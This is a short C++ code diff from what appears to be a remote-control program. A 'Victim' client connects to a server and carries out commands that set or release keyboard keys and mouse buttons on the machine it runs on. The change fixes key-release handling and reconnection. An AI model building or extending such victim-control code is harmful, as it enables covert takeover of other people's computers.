@@ -56,8 +56,17 @@ int Victim::controlVictim()
         }
         //release all keys
         else if (cmd == 'a') {
-            for (int i = 0; i < 255; i++)
-                Mlib::Keyboard::setState(Mlib::Keyboard::Key(i), false);
+            for (int i = 0; i < 255; i++) {
+                if (!keysStates[i])
+                    continue;
+                keysStates[i] = false;
+
+                //if its a mouse key, treat it accordingly
+                if (i == 0x01 || i == 0x02 || i == 0x04 || i == 0x05 || i == 0x06)
+                    Mlib::Mouse::setState(Mlib::Mouse::Button(i), false);
+                else
+                    Mlib::Keyboard::setState(Mlib::Keyboard::Key(i), false);
+            }
         }
         //apparently victim isnt initialized
         else if (cmd == '?') {
@@ -70,6 +79,7 @@ int Victim::controlVictim()
 
 void Victim::connectServer()
 {
+    isConnected = false;
     while (server.connect(SERVER_IP, SERVER_PORT) != sf::Socket::Done) {}
     std::cout << "connected with server\n";
 
